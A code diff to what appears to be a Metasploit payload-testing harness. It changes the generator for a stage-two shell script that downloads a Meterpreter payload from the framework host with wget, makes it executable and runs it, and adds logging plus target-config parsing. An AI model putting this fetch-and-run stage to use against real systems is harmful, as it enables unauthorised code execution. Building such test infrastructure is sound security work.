@@ -746,17 +746,25 @@ def makeStageTwoShScript(targetData, httpPort, remoteLogFile, terminationToken):
         if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
             msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
             payloadFile = sessionData['PAYLOAD']['FILENAME']
-            url = "'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
-            stageTwoShContent = stageTwoShContent + "\nwget " + url + "\n"
+            url = "'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'"
+            stageTwoShContent = stageTwoShContent + "echo URL =  " + url + " > " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "\nwget " + url + " >> " + remoteLogFile + " 2>&1\n"
             stageTwoShContent = stageTwoShContent + "sleep 5 \n"
-            stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadFile + "\n"
+            stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadFile + " >> " + remoteLogFile + " 2>&1\n"
+            stageTwoShContent = stageTwoShContent + "echo \"test\n\n\" >> " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "echo \"ls\n\n\" >> " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "ls -lart " + payloadFile + " >> " + remoteLogFile + " 2>&1\n"
+            stageTwoShContent = stageTwoShContent + "file " + payloadFile + " >> " + remoteLogFile + " 2>&1\n"
             if '.py' in payloadFile:
                 stageTwoShContent = stageTwoShContent + targetData['METERPRETER_PYTHON'] + " " + payloadFile + "&\n"
             elif 'jar' in payloadFile:
                 stageTwoShContent = stageTwoShContent + targetData['METERPRETER_JAVA'] + " -jar " + payloadFile + "&\n"
             else:
                 stageTwoShContent = stageTwoShContent + "./" + payloadFile + "&\n"
-            stageTwoShContent = stageTwoShContent + "echo " + terminationToken + " > " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "sleep 5 \n"
+            stageTwoShContent = stageTwoShContent + "netstat -ant >> " + remoteLogFile + " 2>&1\n"
+            stageTwoShContent = stageTwoShContent + "ps -ef >> " + remoteLogFile + "\n\n"
+            stageTwoShContent = stageTwoShContent + "echo " + terminationToken + " >> " + remoteLogFile + "\n"
     return stageTwoShContent
 
 
@@ -797,7 +805,15 @@ def prepConfig(args):
     if None == configData:
         logMsg(logFile, "THERE WAS A PROBLEM WITH THE TEST JSON CONFIG FILE")
         exit(999)
-        
+    if args.targetFile != None:
+        configData['TARGETS'] = parseTestConfig(args.targetFile)
+    if 'TARGET_FILE' in configData['TARGETS']:
+        configData['TARGETS'] = parseTestConfig(configData['TARGETS']['TARGET_FILE'])['MSF_HOSTS'].copy()
+    if args.msfHostsFile != None:
+        configData['MSF_HOSTS'] = parseTestConfig(args.msfHostsFile)['MSF_HOSTS']
+        print(str(configData['MSF_HOSTS']))
+    if 'MSF_HOST_FILE' in configData['MSF_HOSTS']:
+        configData['MSF_HOSTS'] = parseTestConfig(configData['MSF_HOSTS']['MSF_HOST_FILE'])
     if args.targetName != None:
         logMsg(logFile, "REPLACING ALL TARGETS WITH SINGLE TARGET " + str(args.targetName))
         newTargets = []
@@ -808,15 +824,13 @@ def prepConfig(args):
         mergedTarget.update(targetOverride)
         newTargets.append(mergedTarget)
         configData['TARGETS'] = newTargets
-
     if args.framework != None:
         configData['FRAMEWORK_BRANCH'] = args.framework
-
     if args.payload != None:
         payloadDic = {}
         payloadDic['NAME'] = args.payload
-        if args.payloadoptions != None:
-            payloadDic['SETTINGS'] = args.payloadoptions.split(',')
+        if args.payloadOptions != None:
+            payloadDic['SETTINGS'] = args.payloadOptions.split(',')
         else:
             payloadDic['SETTINGS'] = []
         if 'PAYLOADS' in configData:
@@ -825,7 +839,6 @@ def prepConfig(args):
             configData['PAYLOADS'] = [payloadDic.copy()]
         if (args.module == None) and ('MODULES' not in configData):
             args.module = "exploit/multi/handler"
-
     if args.module != None:
         moduleDic = {}
         moduleDic['NAME'] = args.module
@@ -1585,22 +1598,25 @@ def __matchListToCatalog(vm_List, catalog_file, logFile="default.log"):
     my_catalog = SystemCatalog(catalog_file)
     defined_vms = []
     for vm in vm_List:
-        if 'CPE' in vm:
-            local_target = my_catalog.findByCPE(vm['CPE'])
-        elif 'OS' in vm:
-            local_target = my_catalog.findByOS(vm['OS'])
-        else:
-            local_target = my_catalog.findByName(vm['NAME'])
-        if local_target is not None:
-            final_vm = vm.copy()
-            final_vm.update(local_target)
-        else:
+        if vm['TYPE'] == 'PHYSICAL':
             final_vm = vm
-        if "USERNAME" not in final_vm:
-            logMsg(logFile, "NO USERNAME FOR " + str(vm))
-            return False
-        if "PASSWORD" not in final_vm:
-            logMsg(logFile, "NO PASSWORD FOR " + str(vm))
-            return False
+        else:
+            if 'CPE' in vm:
+                local_target = my_catalog.findByCPE(vm['CPE'])
+            elif 'OS' in vm:
+                local_target = my_catalog.findByOS(vm['OS'])
+            else:
+                local_target = my_catalog.findByName(vm['NAME'])
+            if local_target is not None:
+                final_vm = vm.copy()
+                final_vm.update(local_target)
+            else:
+                final_vm = vm
+            if "USERNAME" not in final_vm:
+                logMsg(logFile, "NO USERNAME FOR " + str(vm))
+                return False
+            if "PASSWORD" not in final_vm:
+                logMsg(logFile, "NO PASSWORD FOR " + str(vm))
+                return False
         defined_vms.append(final_vm)
     return defined_vms
